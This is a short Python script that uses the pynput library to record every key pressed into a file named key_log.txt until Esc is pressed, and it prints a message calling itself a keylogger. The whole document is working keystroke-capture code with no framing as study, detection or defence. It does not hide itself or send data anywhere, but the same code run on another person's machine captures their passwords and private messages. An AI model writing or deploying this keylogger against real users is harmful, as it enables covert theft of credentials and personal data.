from pynput import keyboard

# File to store keystrokes
log_file = "key_log.txt"

# Function to write to file
def write_to_file(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")

# Event: Key Press
def on_press(key):
    write_to_file(key)

# Event: Listener Stop (e.g., pressing Esc)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started... Press ESC to stop.")
    listener.join()
